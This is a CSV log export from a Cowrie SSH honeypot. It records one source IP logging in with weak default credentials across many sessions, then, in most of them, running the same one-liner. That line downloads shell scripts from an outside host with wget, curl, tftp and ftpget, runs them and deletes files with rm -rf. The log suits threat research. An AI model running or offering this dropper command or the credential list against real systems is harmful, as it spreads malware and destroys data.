eventid,timestamp,src_ip,dst_ip,session,duration,message
cowrie.session.connect,2021-02-12 17:57:54.417573+00:00,64.225.100.21,155.232.195.82,fde8bd71451a,,New connection: 64.225.100.21:42568 (155.232.195.82:2222) [session: fde8bd71451a]
cowrie.session.connect,2021-02-12 17:57:54.418815+00:00,64.225.100.21,155.232.195.82,fcc9112cbf95,,New connection: 64.225.100.21:52026 (155.232.195.82:2222) [session: fcc9112cbf95]
cowrie.client.version,2021-02-12 17:57:54.420056+00:00,64.225.100.21,,d08bc54e25ab,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:57:54.420872+00:00,64.225.100.21,,9becd2edfa56,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:57:54.421657+00:00,64.225.100.21,,f79525b356de,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:57:54.422949+00:00,64.225.100.21,,c1a8e543c8de,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:57:54.423729+00:00,64.225.100.21,,831e09a89b9b,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:57:54.424523+00:00,64.225.100.21,,5d0c34f593dd,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:57:54.425301+00:00,64.225.100.21,,2d15bc3b81bf,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:57:54.426076+00:00,64.225.100.21,,0da36a409b16,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:57:54.426861+00:00,64.225.100.21,,35f230741a47,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:57:54.427660+00:00,64.225.100.21,,fde8bd71451a,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:57:54.428448+00:00,64.225.100.21,,fcc9112cbf95,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.session.closed,2021-02-12 17:57:54.429492+00:00,64.225.100.21,,4feb1411beac,153.6971673965454,Connection lost after 153 seconds
cowrie.client.kex,2021-02-12 17:57:54.612782+00:00,64.225.100.21,,f79525b356de,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 17:57:54.618950+00:00,64.225.100.21,,9becd2edfa56,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 17:57:54.622068+00:00,64.225.100.21,,c1a8e543c8de,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 17:57:54.625297+00:00,64.225.100.21,,fde8bd71451a,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 17:57:54.627924+00:00,64.225.100.21,,fcc9112cbf95,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 17:57:54.630560+00:00,64.225.100.21,,d08bc54e25ab,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 17:57:54.632967+00:00,64.225.100.21,,831e09a89b9b,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 17:57:54.635001+00:00,64.225.100.21,,0da36a409b16,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 17:57:54.637034+00:00,64.225.100.21,,5d0c34f593dd,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 17:57:54.639053+00:00,64.225.100.21,,2d15bc3b81bf,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 17:57:54.643696+00:00,64.225.100.21,,35f230741a47,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.session.closed,2021-02-12 17:57:54.648143+00:00,64.225.100.21,,65a9d7d4f1f8,153.91431999206543,Connection lost after 153 seconds
cowrie.session.closed,2021-02-12 17:57:54.649653+00:00,64.225.100.21,,ebcf4b91b532,153.91443300247192,Connection lost after 153 seconds
cowrie.login.success,2021-02-12 17:57:55.381949+00:00,64.225.100.21,,f79525b356de,,login attempt [ansible/123456] succeeded
cowrie.login.success,2021-02-12 17:57:55.475107+00:00,64.225.100.21,,fcc9112cbf95,,login attempt [git/git] succeeded
cowrie.login.success,2021-02-12 17:57:55.478079+00:00,64.225.100.21,,fde8bd71451a,,login attempt [user/user] succeeded
cowrie.login.success,2021-02-12 17:57:55.480982+00:00,64.225.100.21,,9becd2edfa56,,login attempt [ansible/ansible] succeeded
cowrie.login.success,2021-02-12 17:57:55.483842+00:00,64.225.100.21,,c1a8e543c8de,,login attempt [root/!QAZ2wsx] succeeded
cowrie.login.success,2021-02-12 17:57:55.599836+00:00,64.225.100.21,,d08bc54e25ab,,login attempt [root/1234567890] succeeded
cowrie.login.success,2021-02-12 17:57:55.608573+00:00,64.225.100.21,,2d15bc3b81bf,,login attempt [butter/xuelp123] succeeded
cowrie.login.success,2021-02-12 17:57:55.611461+00:00,64.225.100.21,,831e09a89b9b,,login attempt [root/1qaz@WSX] succeeded
cowrie.login.success,2021-02-12 17:57:55.614305+00:00,64.225.100.21,,5d0c34f593dd,,login attempt [root/1qaz2wsx] succeeded
cowrie.login.success,2021-02-12 17:57:55.616345+00:00,64.225.100.21,,0da36a409b16,,login attempt [postgres/postgres] succeeded
cowrie.login.success,2021-02-12 17:57:55.618527+00:00,64.225.100.21,,35f230741a47,,login attempt [dev/dev] succeeded
cowrie.session.params,2021-02-12 17:57:55.923105+00:00,64.225.100.21,,f79525b356de,,[]
cowrie.command.input,2021-02-12 17:57:55.924087+00:00,64.225.100.21,,f79525b356de,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:57:55.956983+00:00,64.225.100.21,,fcc9112cbf95,,[]
cowrie.command.input,2021-02-12 17:57:55.957838+00:00,64.225.100.21,,fcc9112cbf95,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:57:56.056770+00:00,64.225.100.21,,fde8bd71451a,,[]
cowrie.command.input,2021-02-12 17:57:56.057628+00:00,64.225.100.21,,fde8bd71451a,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:57:56.184402+00:00,64.225.100.21,,9becd2edfa56,,[]
cowrie.command.input,2021-02-12 17:57:56.185296+00:00,64.225.100.21,,9becd2edfa56,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:57:56.225943+00:00,64.225.100.21,,c1a8e543c8de,,[]
cowrie.command.input,2021-02-12 17:57:56.226850+00:00,64.225.100.21,,c1a8e543c8de,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download,2021-02-12 17:57:56.418710+00:00,64.225.100.21,,f79525b356de,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.params,2021-02-12 17:57:56.594097+00:00,64.225.100.21,,d08bc54e25ab,,[]
cowrie.command.input,2021-02-12 17:57:56.595029+00:00,64.225.100.21,,d08bc54e25ab,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:57:56.791478+00:00,64.225.100.21,,2d15bc3b81bf,,[]
cowrie.command.input,2021-02-12 17:57:56.792355+00:00,64.225.100.21,,2d15bc3b81bf,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:57:56.831913+00:00,64.225.100.21,,35f230741a47,,[]
cowrie.command.input,2021-02-12 17:57:56.832824+00:00,64.225.100.21,,35f230741a47,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:57:57.068835+00:00,64.225.100.21,,831e09a89b9b,,[]
cowrie.command.input,2021-02-12 17:57:57.069694+00:00,64.225.100.21,,831e09a89b9b,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:57:57.109175+00:00,64.225.100.21,,0da36a409b16,,[]
cowrie.command.input,2021-02-12 17:57:57.110035+00:00,64.225.100.21,,0da36a409b16,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:57:57.149856+00:00,64.225.100.21,,5d0c34f593dd,,[]
cowrie.command.input,2021-02-12 17:57:57.150731+00:00,64.225.100.21,,5d0c34f593dd,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download,2021-02-12 17:57:57.157971+00:00,64.225.100.21,,9becd2edfa56,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 17:57:57.159649+00:00,64.225.100.21,,fcc9112cbf95,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 17:57:57.161258+00:00,64.225.100.21,,fde8bd71451a,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.connect,2021-02-12 17:57:57.164179+00:00,64.225.100.21,155.232.195.82,728c984c176c,,New connection: 64.225.100.21:33292 (155.232.195.82:2222) [session: 728c984c176c]
cowrie.session.file_download,2021-02-12 17:57:57.165693+00:00,64.225.100.21,,c1a8e543c8de,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.client.version,2021-02-12 17:57:57.167220+00:00,64.225.100.21,,728c984c176c,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.session.file_download,2021-02-12 17:57:57.353411+00:00,64.225.100.21,,f79525b356de,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download.failed,2021-02-12 17:58:47.578677+00:00,64.225.100.21,,f79525b356de,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.file_download,2021-02-12 17:58:47.582587+00:00,64.225.100.21,,d08bc54e25ab,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.client.kex,2021-02-12 17:58:47.584210+00:00,64.225.100.21,,728c984c176c,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.session.connect,2021-02-12 17:58:47.612741+00:00,209.141.43.49,155.232.195.83,5a62717dbdb5,,New connection: 209.141.43.49:35932 (155.232.195.83:2222) [session: 5a62717dbdb5]
cowrie.session.file_download,2021-02-12 17:58:47.614493+00:00,64.225.100.21,,2d15bc3b81bf,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 17:58:47.616229+00:00,64.225.100.21,,5d0c34f593dd,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 17:58:47.617849+00:00,64.225.100.21,,35f230741a47,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 17:58:47.619435+00:00,64.225.100.21,,831e09a89b9b,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 17:58:47.620967+00:00,64.225.100.21,,fde8bd71451a,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download.failed,2021-02-12 17:59:37.849994+00:00,64.225.100.21,,fde8bd71451a,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.file_download,2021-02-12 17:59:37.853307+00:00,64.225.100.21,,9becd2edfa56,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download.failed,2021-02-12 18:00:28.093987+00:00,64.225.100.21,,9becd2edfa56,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.file_download,2021-02-12 18:00:28.097335+00:00,64.225.100.21,,0da36a409b16,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 18:00:28.099412+00:00,64.225.100.21,,fcc9112cbf95,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download.failed,2021-02-12 18:01:18.330388+00:00,64.225.100.21,,fcc9112cbf95,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.connect,2021-02-12 18:01:18.332865+00:00,64.225.100.21,155.232.195.82,df40bea0d41f,,New connection: 64.225.100.21:42756 (155.232.195.82:2222) [session: df40bea0d41f]
cowrie.session.connect,2021-02-12 18:01:18.334022+00:00,64.225.100.21,155.232.195.82,ad9c198d5044,,New connection: 64.225.100.21:52200 (155.232.195.82:2222) [session: ad9c198d5044]
cowrie.session.connect,2021-02-12 18:01:18.335153+00:00,64.225.100.21,155.232.195.82,45dad8334c0b,,New connection: 64.225.100.21:33490 (155.232.195.82:2222) [session: 45dad8334c0b]
cowrie.session.connect,2021-02-12 18:01:18.336396+00:00,64.225.100.21,155.232.195.82,cd68e42b4fa1,,New connection: 64.225.100.21:42924 (155.232.195.82:2222) [session: cd68e42b4fa1]
cowrie.session.connect,2021-02-12 18:01:18.337523+00:00,64.225.100.21,155.232.195.82,f170ce10a748,,New connection: 64.225.100.21:52504 (155.232.195.82:2222) [session: f170ce10a748]
cowrie.session.connect,2021-02-12 18:01:18.338634+00:00,64.225.100.21,155.232.195.82,576b823162c6,,New connection: 64.225.100.21:33612 (155.232.195.82:2222) [session: 576b823162c6]
cowrie.session.connect,2021-02-12 18:01:18.339738+00:00,64.225.100.21,155.232.195.82,ec7e61660b1d,,New connection: 64.225.100.21:43090 (155.232.195.82:2222) [session: ec7e61660b1d]
cowrie.session.connect,2021-02-12 18:01:18.340843+00:00,64.225.100.21,155.232.195.82,ba52425fafbd,,New connection: 64.225.100.21:52560 (155.232.195.82:2222) [session: ba52425fafbd]
cowrie.session.connect,2021-02-12 18:01:18.341938+00:00,64.225.100.21,155.232.195.82,2b149190eac6,,New connection: 64.225.100.21:33700 (155.232.195.82:2222) [session: 2b149190eac6]
cowrie.session.connect,2021-02-12 18:01:18.343395+00:00,64.225.100.21,155.232.195.82,f237f8bd812f,,New connection: 64.225.100.21:43248 (155.232.195.82:2222) [session: f237f8bd812f]
cowrie.session.connect,2021-02-12 18:01:18.344545+00:00,64.225.100.21,155.232.195.82,2977d04aa42e,,New connection: 64.225.100.21:52678 (155.232.195.82:2222) [session: 2977d04aa42e]
cowrie.session.connect,2021-02-12 18:01:18.345651+00:00,64.225.100.21,155.232.195.82,07f71d2b7dec,,New connection: 64.225.100.21:33998 (155.232.195.82:2222) [session: 07f71d2b7dec]
cowrie.session.connect,2021-02-12 18:01:18.346754+00:00,64.225.100.21,155.232.195.82,a697097da28a,,New connection: 64.225.100.21:43472 (155.232.195.82:2222) [session: a697097da28a]
cowrie.session.closed,2021-02-12 18:01:18.348285+00:00,209.141.43.49,,5a62717dbdb5,150.73433566093445,Connection lost after 150 seconds
cowrie.session.closed,2021-02-12 18:01:18.359812+00:00,64.225.100.21,,2d15bc3b81bf,203.9449508190155,Connection lost after 203 seconds
cowrie.session.closed,2021-02-12 18:01:18.360829+00:00,64.225.100.21,,5d0c34f593dd,203.94721674919128,Connection lost after 203 seconds
cowrie.session.closed,2021-02-12 18:01:18.361792+00:00,64.225.100.21,,35f230741a47,203.94442343711853,Connection lost after 203 seconds
cowrie.session.closed,2021-02-12 18:01:18.362756+00:00,64.225.100.21,,831e09a89b9b,203.95037412643433,Connection lost after 203 seconds
